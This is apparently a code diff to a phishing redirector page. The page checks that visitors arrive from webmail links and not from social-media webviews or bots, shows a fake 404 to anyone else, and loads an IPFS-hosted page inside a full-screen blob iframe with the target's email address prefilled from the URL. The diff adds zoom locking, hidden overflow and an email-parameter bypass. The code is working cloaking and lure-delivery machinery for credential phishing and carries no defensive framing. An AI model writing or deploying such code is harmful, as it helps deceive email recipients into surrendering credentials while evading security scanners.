@@ -2,10 +2,10 @@
 <html>
 <head>
     <title>Blob IPFS Redirect + Email Only + Anti-Bot</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <style>
-html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
+html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; overflow:hidden; }
 
 /* Overlay for human check */
 #overlay {
@@ -50,6 +50,18 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
 .error-404 h1 { font-size:90px; margin:0; }
 .error-404 h2 { font-size:26px; margin:0; }
 .error-404 p  { font-size:18px; }
+
+/* Full page iframe */
+.fullpage-iframe {
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    border:none;
+    margin:0;
+    padding:0;
+}
 </style>
 </head>
 <body>
@@ -72,18 +84,14 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
 </div>
 
 <script>
-/* ------------------------------------------------------
-   SOCIAL MEDIA / WEBVIEW DETECTION
------------------------------------------------------- */
+/* ------------------------- SOCIAL MEDIA / WEBVIEW DETECTION ------------------------- */
 function isSocialMediaBrowser() {
     const ua = navigator.userAgent.toLowerCase();
 
-    // Allow real browsers
     const isIOSorMac = /iphone|ipad|ipod|macintosh/.test(ua);
     const isSafari = /safari/.test(ua) && !/chrome|crios|fxios|edgios/.test(ua);
     if (isIOSorMac && isSafari) return false;
 
-    // Detect common social media webviews
     const socialUA = [
         "instagram","fbav","fban","facebook",
         "tiktok","musical.ly","snapchat",
@@ -93,45 +101,38 @@ function isSocialMediaBrowser() {
     ];
     if (socialUA.some(x=>ua.includes(x))) return true;
 
-    // WebView indicators
     const webviewIndicators = ["; wv","wv","version/0","version/1"];
     if (webviewIndicators.some(x=>ua.includes(x))) return true;
 
-    // Missing browser APIs
     if (!("onbeforeunload" in window)) return true;
     if (typeof window.indexedDB === "undefined") return true;
 
     return false;
 }
 
-/* ------------------------------------------------------
-   EMAIL REFERRER CHECK
------------------------------------------------------- */
+/* ------------------------- EMAIL REFERRER & PARAM CHECK ------------------------- */
 function cameFromEmail() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if(urlParams.get("source")==="email") return true;
+
     const ref = document.referrer.toLowerCase();
     const emailDomains = [
         "mail.google.com", "outlook.com", "office.com",
         "mail.yahoo.com", "icloud.com", "fastmail.com", "proton.me"
     ];
 
-    // No referrer → allow (many mobile email apps)
-    if (!ref || ref.trim() === "") return true;
-
+    if (!ref || ref.trim() === "") return true; // many mobile apps
     return emailDomains.some(x => ref.includes(x));
 }
 
-/* ------------------------------------------------------
-   MASTER RULE: ONLY EMAIL, BLOCK SOCIAL WEBVIEWS
------------------------------------------------------- */
+/* ------------------------- MASTER RULE ------------------------- */
 function enforceEmailOnly() {
     if (!cameFromEmail()) return false;
     if (isSocialMediaBrowser()) return false;
     return true;
 }
 
-/* ------------------------------------------------------
-   ULTRA ANTI-BOT MODULE
------------------------------------------------------- */
+/* ------------------------- ULTRA ANTI-BOT ------------------------- */
 async function strongBotCheck() {
     let score=0;
     const ua=navigator.userAgent.toLowerCase();
@@ -151,17 +152,24 @@ async function strongBotCheck() {
     return score>=60;
 }
 
-/* ------------------------------------------------------
-   IPFS REDIRECT CONFIG
------------------------------------------------------- */
+/* ------------------------- IPFS REDIRECT ------------------------- */
 const BASE_IPFS="https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 function getEmail(){return new URLSearchParams(location.search).get("email")||"";}
 function buildIPFS(email){return email?BASE_IPFS+"#"+email:BASE_IPFS;}
-function createBlobHTML(url){return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body style="margin:0"><iframe style="width:100%;height:100%;border:none" src="${url}"></iframe></body></html>`;}
+function createBlobHTML(url){
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>html,body,iframe{width:100%;height:100%;margin:0;padding:0;overflow:hidden}iframe{position:fixed;top:0;left:0;border:none}</style>
+</head>
+<body>
+<iframe src="${url}" class="fullpage-iframe"></iframe>
+</body>
+</html>`;
+}
 
-/* ------------------------------------------------------
-   HUMAN CHECK
------------------------------------------------------- */
+/* ------------------------- HUMAN CHECK ------------------------- */
 function requireVerification(){
     return new Promise(resolve=>{
         const overlay=document.getElementById("overlay");
@@ -177,14 +185,10 @@ function requireVerification(){
     });
 }
 
-/* ------------------------------------------------------
-   404 PAGE
------------------------------------------------------- */
+/* ------------------------- 404 PAGE ------------------------- */
 function show404(){document.body.innerHTML=`<div class="error-404"><h1>404</h1><h2>Error</h2><p>The requested page could not be found.</p></div>`;}
 
-/* ------------------------------------------------------
-   MAIN FLOW
------------------------------------------------------- */
+/* ------------------------- MAIN FLOW ------------------------- */
 document.addEventListener("DOMContentLoaded",async()=>{
     if(!enforceEmailOnly()){show404(); return;}
     if(await strongBotCheck()){show404(); return;}
